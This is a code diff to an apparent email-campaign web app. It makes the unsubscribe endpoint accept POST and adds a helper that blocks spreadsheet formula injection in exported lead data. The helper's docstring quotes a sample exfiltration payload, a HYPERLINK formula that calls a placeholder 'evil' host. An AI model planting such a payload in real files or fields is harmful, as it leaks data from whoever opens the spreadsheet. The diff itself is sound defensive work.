@@ -447,7 +447,11 @@ def _verify_unsub_token(token: str):
         return None
 
 
-@app.route("/unsubscribe/<token>")
+# RFC 8058: sender.py advertises List-Unsubscribe-Post, which tells Gmail and
+# Yahoo to POST here when the user clicks their native Unsubscribe button.
+# GET-only meant that POST got a 405, so the button silently failed while we
+# claimed to support it -- exactly what the 2024 bulk-sender rules penalise.
+@app.route("/unsubscribe/<token>", methods=["GET", "POST"])
 def unsubscribe(token):
     email_addr = _verify_unsub_token(token)
     if not email_addr:
@@ -896,6 +900,27 @@ def api_ai_review():
         return jsonify({"error": "Unexpected error — check server logs for details"}), 500
 
 
+# Leading characters that make Excel/Sheets treat a cell as a formula. Tab and
+# carriage return are included because both are stripped before evaluation, so
+# "	=cmd" is still executed.
+_FORMULA_TRIGGERS = ("=", "+", "-", "@", chr(9), chr(13))
+
+
+def _no_formula(value):
+    """
+    Neutralise spreadsheet formula injection in exported cells.
+
+    Company names and addresses are scraped from arbitrary websites, so their
+    contents are attacker-controlled. Excel and Sheets evaluate any cell whose
+    text starts with one of _FORMULA_TRIGGERS, so a business named
+    =HYPERLINK("http://evil/?"&A1) would exfiltrate the row when the operator
+    opens the export. A leading apostrophe forces the cell to be read as text.
+    """
+    if not isinstance(value, str):
+        return value
+    return "'" + value if value[:1] in _FORMULA_TRIGGERS else value
+
+
 # ── API: Stats ────────────────────────────────────────────────────────────────
 
 @app.route("/api/stats")
@@ -992,11 +1017,13 @@ def api_export_campaign(cid):
         "unsubscribed": "Unsubscribed",
     }
     for r, row in enumerate(rows, 2):
-        ws.cell(r, 1, row["email"] or "")
-        ws.cell(r, 2, row["first_name"] or "")
-        ws.cell(r, 3, row["last_name"] or "")
-        ws.cell(r, 4, row["company"] or "")
-        ws.cell(r, 5, row["variant_label"] or "—")
+        # company and the name fields are scraped from arbitrary websites, so
+        # every free-text cell goes through _no_formula.
+        ws.cell(r, 1, _no_formula(row["email"] or ""))
+        ws.cell(r, 2, _no_formula(row["first_name"] or ""))
+        ws.cell(r, 3, _no_formula(row["last_name"] or ""))
+        ws.cell(r, 4, _no_formula(row["company"] or ""))
+        ws.cell(r, 5, _no_formula(row["variant_label"] or "—"))
         ws.cell(r, 6, STATUS_LABELS.get(row["status"], row["status"] or ""))
         ws.cell(r, 7, row["steps_sent"])
         ws.cell(r, 8, row["current_step"])
@@ -1434,7 +1461,7 @@ def api_db_table_export(name):
         for col in masked_cols:
             if col in r and r[col]:
                 r[col] = _SECRET_PLACEHOLDER
-        w.writerow([r.get(col, "") for col in columns])
+        w.writerow([_no_formula(r.get(col, "")) for col in columns])
 
     resp = make_response(buf.getvalue())
     resp.headers["Content-Disposition"] = f"attachment; filename={name}.csv"
